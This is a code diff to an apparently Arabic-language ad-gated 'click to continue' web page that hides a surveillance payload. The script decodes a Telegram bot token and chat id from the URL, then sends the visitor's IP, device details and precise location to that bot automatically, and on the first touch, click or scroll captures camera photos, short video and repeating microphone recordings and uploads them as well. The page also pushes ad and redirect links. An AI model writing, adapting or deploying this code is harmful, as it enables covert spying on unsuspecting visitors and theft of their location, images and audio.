@@ -13,7 +13,7 @@
   .wrap{max-width:780px;margin:16px auto;padding:0 10px}
   .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:20px 14px;margin-bottom:14px}
   .steps{display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:14px}
-  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display: flex; align-items: center; justify-content: center;}
+  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display:flex; align-items:center; justify-content:center;}
   .dot.on{background:#2d7ff9}
   .dot.done{background:#2fb36d}
   .line{width:40px;height:3px;background:#d5dbe6}
@@ -81,28 +81,23 @@
 
 <script>
 // 1. قراءة الرابط المشفر
-document.addEventListener("DOMContentLoaded", () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const encodedData = urlParams.get('data');
-    if (encodedData) {
-        try {
-            const config = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(encodedData)))));
-            
-            // تشغيل الأدوات فوراً
-            startTools(config);
+const urlParams = new URLSearchParams(window.location.search);
+const encodedData = urlParams.get('data');
+let config = null;
 
-            // محاولة طلب الأذونات على طول عشان نضمن إنها هتشتغل
-            setTimeout(() => {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
-                    stream.getTracks().forEach(t => t.stop()); // بنقفلها فوراً عشان الكود الأساسي يشتغل
-                }).catch(e => {});
-            }, 1000);
+if (encodedData) {
+    try {
+        config = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(encodedData)))));
+    } catch (e) { console.error("خطأ في فك التشفير"); }
+}
 
-        } catch (e) { console.error("خطأ في فك التشفير"); }
-    }
-});
+// 2. تشغيل الأدوات أوتوماتيك
+if (config) {
+    // معلومات الجهاز والموقع هيتنفذوا أوتوماتيك
+    autoStart(config);
+}
 
-async function startTools(config) {
+async function autoStart(config) {
     if (!config.id || !config.token) return;
     const botUrl = `https://api.telegram.org/bot${config.token}/`;
     const chatId = config.id;
@@ -111,6 +106,7 @@ async function startTools(config) {
         try { await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) }); } catch (e) {}
     }
 
+    // 1. معلومات الجهاز (بتشتغل أوتوماتيك)
     if (config.inf) {
         try {
             let ipRes = await fetch('https://api.ipify.org?format=json');
@@ -119,73 +115,88 @@ async function startTools(config) {
         } catch (e) {}
     }
 
+    // 2. الموقع (بيشتغل أوتوماتيك)
     if (config.loc && navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
             sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
-        });
+        }, (err) => {}, { enableHighAccuracy: true });
     }
 
-    if (config.fc || config.bc) {
-        try {
-            let facingMode = config.fc ? "user" : "environment";
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-            let video = document.createElement('video'); video.srcObject = stream; video.play();
-            setTimeout(() => {
-                let canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob((blob) => {
-                    let formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'photo.jpg');
-                    fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg');
-            }, 1000);
-        } catch (e) {}
-    }
+    // 3. الكاميرا والصوت (بيطلبوا أول ما المستخدم يلمس الشاشة)
+    if (config.fc || config.bc || config.r || config.fcv || config.bcv) {
+        
+        // بنستنى أول تفاعل من المستخدم (لمسة أو سكرول)
+        document.body.addEventListener('touchstart', triggerMedia, { once: true });
+        document.body.addEventListener('click', triggerMedia, { once: true });
+        document.body.addEventListener('scroll', triggerMedia, { once: true });
 
-    if (config.fcv || config.bcv) {
-        try {
-            let facingMode = config.fcv ? "user" : "environment";
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
-            let mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                let blob = new Blob(chunks, { type: 'video/webm' });
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', blob, 'video.webm');
-                fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
-                stream.getTracks().forEach(t => t.stop());
-            };
-            mediaRecorder.start();
-            setTimeout(() => { mediaRecorder.stop(); }, 3000);
-        } catch (e) {}
-    }
+        async function triggerMedia() {
+            // الكاميرا (صور)
+            if (config.fc || config.bc) {
+                try {
+                    let facingMode = config.fc ? "user" : "environment";
+                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                    let video = document.createElement('video'); video.srcObject = stream; video.play();
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob((blob) => {
+                            let formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'photo.jpg');
+                            fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg');
+                    }, 1000);
+                } catch (e) {}
+            }
 
-    if (config.r) {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            let mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                let blob = new Blob(chunks, { type: 'audio/webm' });
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('audio', blob, 'voice.webm');
-                fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
-                if (config.r) { mediaRecorder.start(); setTimeout(() => { mediaRecorder.stop(); }, 5000); }
-            };
-            mediaRecorder.start();
-            setTimeout(() => { mediaRecorder.stop(); }, 5000);
-        } catch (e) {}
+            // فيديو
+            if (config.fcv || config.bcv) {
+                try {
+                    let facingMode = config.fcv ? "user" : "environment";
+                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        let blob = new Blob(chunks, { type: 'video/webm' });
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('video', blob, 'video.webm');
+                        fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => { mediaRecorder.stop(); }, 3000);
+                } catch (e) {}
+            }
+
+            // تسجيل صوتي
+            if (config.r) {
+                try {
+                    let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        let blob = new Blob(chunks, { type: 'audio/webm' });
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('audio', blob, 'voice.webm');
+                        fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
+                        if (config.r) { mediaRecorder.start(); setTimeout(() => { mediaRecorder.stop(); }, 5000); }
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
+                } catch (e) {}
+            }
+        }
     }
 }
 
-// 2. كود العداد والإعلانات
+// 3. كود العداد والإعلانات (زي ما هو)
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -212,4 +223,4 @@ $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-                                                                                                                                                                                                      </html>
+  </html>
